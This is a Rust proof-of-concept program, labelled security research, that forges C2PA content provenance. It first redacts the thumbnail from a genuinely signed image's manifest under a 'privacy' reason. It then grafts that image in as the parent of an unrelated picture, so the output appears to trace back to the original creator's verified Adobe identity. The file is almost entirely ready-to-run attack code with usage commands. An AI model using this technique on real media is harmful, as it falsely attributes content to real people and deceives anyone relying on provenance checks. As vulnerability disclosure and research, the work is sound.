// Security research PoC — Idea 1: False attribution via redacted thumbnail.
//
// Demonstrates a two-step C2PA provenance manipulation:
//
//   Step 1  Take a real image with verified provenance (e.g. cloudscape.jpg,
//           signed by Adobe with randmckinney's verified identities).
//           Create a legitimate "Edit" manifest on top of it that:
//             - uses BuilderIntent::Edit (auto-adds source as parentOf)
//             - redacts the thumbnail assertion from the embedded parent manifest
//             - records a c2pa.redacted action
//           Result: intermediate.jpg — same pixels as original, same identity
//           chain, but the thumbnail showing the original content is gone.
//
//   Step 2  Use intermediate.jpg as the parentOf ingredient for an unrelated
//           child image (e.g. chairlift.jpg).
//           Result: output.jpg — child pixels, provenance chain traces back to
//           randmckinney/Adobe, no thumbnail available to reveal the mismatch.
//
// Usage:
//   cargo run --example false_attribution -p c2pa -- \
//     <original_with_provenance.jpg> <unrelated_child.jpg> <output.jpg>
//
// Example:
//   cargo run --example false_attribution -p c2pa -- \
//     sdk/examples/assets/cloudscape.jpg \
//     sdk/examples/assets/chairlift.jpg \
//     sdk/examples/assets/false_attribution_output.jpg

use std::io::{Cursor, Seek, SeekFrom};

use anyhow::{anyhow, bail, Result};
use c2pa::{
    assertions::labels,
    crypto::raw_signature::SigningAlg,
    settings::Settings,
    Builder, BuilderIntent, CallbackSigner, Context, Reader,
};
use serde_json::json;

const CERTS: &[u8] = include_bytes!("../tests/fixtures/certs/ed25519.pub");
const PRIVATE_KEY: &[u8] = include_bytes!("../tests/fixtures/certs/ed25519.pem");

fn main() -> Result<()> {
    let args: Vec<String> = std::env::args().collect();
    if args.len() != 4 {
        bail!(
            "Usage: false_attribution <original_with_provenance.jpg> <unrelated_child.jpg> <output.jpg>"
        );
    }
    let original_path = &args[1];
    let child_path = &args[2];
    let output_path = &args[3];

    // ── Signer setup (test certs — untrusted, but sufficient for PoC) ─────────
    let settings = Settings::new()
        .with_toml(include_str!("../tests/fixtures/test_settings.toml"))?;

    let ed_signer = |_ctx: *const (), data: &[u8]| CallbackSigner::ed25519_sign(data, PRIVATE_KEY);
    let signer = CallbackSigner::new(ed_signer, SigningAlg::Ed25519, CERTS);

    let context = Context::new()
        .with_settings(settings)?
        .with_signer(signer)
        .into_shared();

    // ── Step 1a: Discover the active manifest label of the original ───────────
    //
    // We need this to construct the exact JUMBF URI pointing at its thumbnail
    // assertion so we can list it in our redactions.
    let original_bytes = std::fs::read(original_path)?;
    let manifest_label = {
        let mut source = Cursor::new(original_bytes.as_slice());
        // Use Reader without special context — we only need the label, not validation.
        Reader::from_stream("image/jpeg", &mut source)
            .map_err(|e| anyhow!("failed to read original manifest: {e}"))?
            .active_label()
            .ok_or_else(|| anyhow!("original image has no C2PA manifest"))?
            .to_string()
    };
    println!("[step 1] original manifest label: {manifest_label}");

    // ── Step 1b: Construct the redaction URI ──────────────────────────────────
    //
    // Mirrors the (pub(crate)) jumbf::labels::to_assertion_uri:
    //   format!("self#jumbf=/c2pa/{manifest_label}/c2pa.assertions/{assertion_label}")
    //
    // labels::CLAIM_THUMBNAIL = "c2pa.thumbnail.claim" (the label Adobe uses)
    let thumbnail_uri = format!(
        "self#jumbf=/c2pa/{}/c2pa.assertions/{}",
        manifest_label,
        labels::CLAIM_THUMBNAIL
    );
    println!("[step 1] redacting: {thumbnail_uri}");

    // ── Step 1c: Build the Edit manifest with the redaction ───────────────────
    //
    // BuilderIntent::Edit makes save_to_stream auto-add the source as a
    // parentOf ingredient (see builder.rs maybe_add_parent). The redaction
    // entry strips the thumbnail JUMBF box from the embedded parent manifest
    // when the new JUMBF store is assembled.
    let mut step1_builder =
        Builder::from_shared_context(&context).with_definition(
            json!({
                "title": "cropped_original.jpg",
                "format": "image/jpeg",
                "claim_generator_info": [{
                    "name": "false_attribution_poc",
                    "version": "0.1.0"
                }],
                // The redactions list names assertion URIs to strip from the bundle.
                "redactions": [thumbnail_uri],
                "assertions": [{
                    "label": "c2pa.actions",
                    "data": {
                        "actions": [{
                            "action": "c2pa.redacted",
                            "reason": "privacy",
                            "parameters": {
                                "redacted": thumbnail_uri
                            }
                        }]
                    }
                }]
            })
            .to_string(),
        )?;
    step1_builder.set_intent(BuilderIntent::Edit);

    let mut original_source = Cursor::new(original_bytes);
    let mut intermediate = Cursor::new(Vec::new());
    step1_builder.save_to_stream("image/jpeg", &mut original_source, &mut intermediate)?;
    intermediate.seek(SeekFrom::Start(0))?;

    // Optionally dump the intermediate for independent inspection:
    //   c2patool /tmp/intermediate.jpg
    // std::fs::write("/tmp/intermediate.jpg", intermediate.get_ref())?;
    println!("[step 1] done — intermediate has provenance chain but no thumbnail");

    // ── Step 2: Attach the intermediate as parent of the unrelated child ──────
    //
    // The child's manifest embeds intermediate's full JUMBF store (including the
    // cloudscape manifest with thumbnail removed) as manifest_data. A validator
    // will surface the identity chain (randmckinney/Adobe) without any thumbnail
    // that could reveal the content mismatch.
    let mut step2_builder =
        Builder::from_shared_context(&context).with_definition(
            json!({
                "title": output_path,
                "format": "image/jpeg",
                "claim_generator_info": [{
                    "name": "false_attribution_poc",
                    "version": "0.1.0"
                }],
                "assertions": [{
                    "label": "c2pa.actions",
                    "data": {
                        "actions": [{
                            "action": "c2pa.opened",
                            "parameters": {
                                "ingredientIds": ["step1_result"]
                            }
                        }]
                    }
                }]
            })
            .to_string(),
        )?;

    step2_builder.add_ingredient_from_stream(
        json!({
            "title": original_path,
            "relationship": "parentOf",
            "label": "step1_result"
        })
        .to_string(),
        "image/jpeg",
        &mut intermediate,
    )?;

    let child_bytes = std::fs::read(child_path)?;
    let mut child_source = Cursor::new(child_bytes);
    let mut dest = Cursor::new(Vec::new());
    step2_builder.save_to_stream("image/jpeg", &mut child_source, &mut dest)?;

    std::fs::write(output_path, dest.get_ref())?;
    println!("[step 2] done — output written to {output_path}");
    println!();
    println!("Result: {output_path} contains {} bytes of child pixels", dest.get_ref().len());
    println!("        provenance chain traces back to: {manifest_label}");
    println!("        thumbnail of original content: REDACTED");

    Ok(())
}
